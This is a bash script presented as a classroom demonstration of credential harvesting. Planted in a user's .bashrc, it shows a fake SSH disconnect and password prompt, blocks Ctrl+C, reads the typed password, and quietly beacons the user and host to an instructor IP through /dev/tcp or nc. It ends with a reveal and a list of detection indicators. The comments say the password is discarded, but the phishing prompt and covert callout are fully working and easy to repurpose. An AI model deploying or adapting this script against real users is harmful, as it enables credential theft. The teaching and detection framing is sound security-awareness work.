#!/usr/bin/env bash
# =============================================================================
#  CREDENTIAL HARVESTER DEMONSTRATION TOOL
#  For authorized classroom / lab use ONLY (T1056.001 / T1078)
#
#  WHAT IT DOES:
#    1. Fakes an SSH session disconnect + re-authentication prompt
#    2. Student types their "password" (input is read then DISCARDED)
#    3. Sends ONLY the string "password captured" to instructor's listener
#    4. Reveals the demonstration after a brief delay
#
#  WHAT IT DOES NOT DO:
#    - Does NOT store, log, or transmit any actual passwords
#    - Does NOT modify any files or system configuration
#    - Does NOT install persistence or leave artifacts
#
#  INSTRUCTOR SETUP:
#    On 10.50.160.2 start a listener before students log in:
#      nc -lnvp 6666
#    Or to catch multiple students:
#      while true; do nc -lnvp 6666; done
#
#  DEPLOYMENT:
#    Add to student .bashrc:
#      source /path/to/keylogger_demo.sh
#
#  Compatible: Ubuntu 18.04+, Debian 9, Debian 12, Kali (all)
#  Dependencies: NONE (uses /dev/tcp bash builtin or falls back to nc)
# =============================================================================

# -- Guard: sourced into non-interactive shell (scp/sftp) = skip --
_kd_is_sourced=0
if (return 0 2>/dev/null); then
    _kd_is_sourced=1
fi
if [ "${_kd_is_sourced}" -eq 1 ]; then
    case "$-" in
        *i*) ;;
        *)   return 2>/dev/null ;;
    esac
fi
if [ ! -t 1 ] || [ ! -t 0 ]; then
    if [ "${_kd_is_sourced}" -eq 1 ]; then
        return 2>/dev/null
    else
        exit 0
    fi
fi

# -- Bash version check --
if [ -z "${BASH_VERSION}" ]; then
    return 2>/dev/null || exit 0
fi
if [ "${BASH_VERSINFO[0]:-0}" -lt 4 ]; then
    return 2>/dev/null || exit 0
fi

# -- Configuration --
_KD_INSTRUCTOR_IP="10.50.160.2"
_KD_INSTRUCTOR_PORT="6666"
_KD_USER="$(whoami)"
_KD_HOST="$(hostname)"

# -- Trap signals so students can't Ctrl+C out during the fake prompt --
trap '' INT TERM QUIT TSTP HUP PIPE
trap '' DEBUG 2>/dev/null || true

# -- Cleanup: restore everything on exit --
_kd_cleanup() {
    trap - INT TERM QUIT TSTP HUP PIPE
    trap - DEBUG 2>/dev/null || true
    stty echo 2>/dev/null
    printf '\033[0m'
    # Ensure cursor is visible
    if command -v tput >/dev/null 2>&1; then
        tput cnorm 2>/dev/null
    else
        printf '\033[?25h'
    fi
}
trap _kd_cleanup EXIT

# -- ANSI codes --
_KD_R='\033[0m'    # reset
_KD_RED='\033[1;31m'
_KD_YEL='\033[1;33m'
_KD_GRN='\033[1;32m'
_KD_DIM='\033[2m'
_KD_BOLD='\033[1m'

# =====================================================================
#  STAGE 1: Fake a plausible SSH disconnect
# =====================================================================
# Small random delay so it doesn't fire the instant they connect
sleep "$(( RANDOM % 3 + 1 ))"

# Clear any prompt that already rendered
printf '\r\033[2K'

# Simulate the kind of output SSH produces on a broken connection
printf '%b\n' "${_KD_DIM}packet_write_wait: Connection to ${_KD_HOST} port 22: Broken pipe${_KD_R}"
sleep 0.3
printf '%b\n' "${_KD_DIM}client_loop: send disconnect: Broken pipe${_KD_R}"
sleep 0.2
printf '%b\n' "${_KD_DIM}Connection to ${_KD_HOST} closed.${_KD_R}"
sleep 0.8

# =====================================================================
#  STAGE 2: Fake SSH re-authentication prompt
# =====================================================================
# Mimic what a student would see reconnecting
printf '\n'
printf '%b\n' "The authenticity of host '${_KD_HOST}' can't be established."
printf '%b\n' "ED25519 key fingerprint is SHA256:$(head -c 32 /dev/urandom 2>/dev/null | base64 2>/dev/null | head -c 43 || echo 'nR4nd0mF1ng3rpr1ntH3r3AAAAAAAAAAAAAAAAAAAAA')."
printf '%b'   "${_KD_USER}@${_KD_HOST}'s password: "

# =====================================================================
#  STAGE 3: Capture input (password is DISCARDED, never stored/sent)
# =====================================================================
# Suppress echo exactly like a real password prompt does
stty -echo 2>/dev/null
# Read into a variable -- we will overwrite and unset it immediately
read -r _kd_throwaway 2>/dev/null
# IMMEDIATELY destroy the input -- never referenced again
_kd_throwaway="DISCARDED"
unset _kd_throwaway
stty echo 2>/dev/null

# Blank line after password entry (mimics real SSH behavior)
printf '\n'

# =====================================================================
#  STAGE 4: Send notification to instructor (NO password data)
# =====================================================================
# Run the entire send in an isolated subshell with ALL output suppressed.
# This guarantees zero error messages leak to the student's terminal.
# Retries 3 times with a 1-second gap to handle listener timing issues.
(
    _msg="[KEYLOGGER DEMO] password captured -- user=${_KD_USER}@${_KD_HOST} -- $(date '+%Y-%m-%d %H:%M:%S')"
    _ip="${_KD_INSTRUCTOR_IP}"
    _port="${_KD_INSTRUCTOR_PORT}"

    # Find nc/ncat if available
    _nc_bin=""
    for _try in nc ncat netcat nc.openbsd nc.traditional; do
        if command -v "${_try}" >/dev/null 2>&1; then
            _nc_bin="${_try}"
            break
        fi
    done

    _kd_try_send() {
        # Attempt 1: bash /dev/tcp builtin (zero dependencies)
        {
            exec 3<>"/dev/tcp/${_ip}/${_port}" &&
            printf '%s\n' "${_msg}" >&3 &&
            exec 3>&-
        } 2>/dev/null && return 0

        # Attempt 2: nc/ncat/netcat
        if [ -n "${_nc_bin}" ]; then
            printf '%s\n' "${_msg}" | "${_nc_bin}" -w 2 "${_ip}" "${_port}" 2>/dev/null && return 0
        fi

        return 1
    }

    # Retry loop -- covers timing gaps where listener isn't ready yet
    for _attempt in 1 2 3; do
        _kd_try_send && exit 0
        sleep 1
    done
    exit 1

) >/dev/null 2>&1 &
disown >/dev/null 2>&1 || true

# =====================================================================
#  STAGE 5: Fake a brief "authenticating" pause then reveal
# =====================================================================
sleep 1.5
# Fake a failed auth to sell the illusion for one more second
printf '%b\n' "Permission denied, please try again."
sleep 1.0
printf '%b'   "${_KD_USER}@${_KD_HOST}'s password: "
sleep 1.5

# =====================================================================
#  STAGE 6: The reveal
# =====================================================================
printf '\n\n'
printf '%b\n' "${_KD_RED}${_KD_BOLD}================================================================${_KD_R}"
printf '%b\n' "${_KD_RED}${_KD_BOLD}  CREDENTIAL HARVESTER DEMONSTRATION${_KD_R}"
printf '%b\n' "${_KD_RED}${_KD_BOLD}================================================================${_KD_R}"
printf '\n'
printf '%b\n' "${_KD_YEL}  What just happened:${_KD_R}"
printf '%b\n' "${_KD_DIM}  1. A fake SSH disconnect was displayed${_KD_R}"
printf '%b\n' "${_KD_DIM}  2. A fake re-authentication prompt appeared${_KD_R}"
printf '%b\n' "${_KD_DIM}  3. You typed your password into an attacker-controlled prompt${_KD_R}"
printf '%b\n' "${_KD_DIM}  4. A \"password captured\" notification was sent to the instructor${_KD_R}"
printf '\n'
printf '%b\n' "${_KD_GRN}  Your actual password was IMMEDIATELY DISCARDED.${_KD_R}"
printf '%b\n' "${_KD_GRN}  It was never stored, logged, or transmitted.${_KD_R}"
printf '\n'
printf '%b\n' "${_KD_YEL}  MITRE ATT&CK techniques demonstrated:${_KD_R}"
printf '%b\n' "${_KD_DIM}    T1056.001 - Input Capture: Keylogging${_KD_R}"
printf '%b\n' "${_KD_DIM}    T1056.002 - Input Capture: GUI Input Capture${_KD_R}"
printf '%b\n' "${_KD_DIM}    T1078     - Valid Accounts (credential theft)${_KD_R}"
printf '%b\n' "${_KD_DIM}    T1557     - Adversary-in-the-Middle${_KD_R}"
printf '\n'
printf '%b\n' "${_KD_YEL}  Detection indicators:${_KD_R}"
printf '%b\n' "${_KD_DIM}    - Suspicious .bashrc modifications${_KD_R}"
printf '%b\n' "${_KD_DIM}    - stty echo manipulation in process list${_KD_R}"
printf '%b\n' "${_KD_DIM}    - Unexpected outbound connections (port ${_KD_INSTRUCTOR_PORT})${_KD_R}"
printf '%b\n' "${_KD_DIM}    - Anomalous /dev/tcp usage in bash history${_KD_R}"
printf '%b\n' "${_KD_DIM}    - File integrity monitoring on shell profiles${_KD_R}"
printf '\n'
printf '%b\n' "${_KD_RED}${_KD_BOLD}================================================================${_KD_R}"
printf '%b\n' "${_KD_DIM}  \"Hack the planet.\" -- Now go check your .bashrc.${_KD_R}"
printf '%b\n' "${_KD_RED}${_KD_BOLD}================================================================${_KD_R}"
printf '\n'

# -- Restore traps and hand back to normal shell --
# cleanup runs via EXIT trap
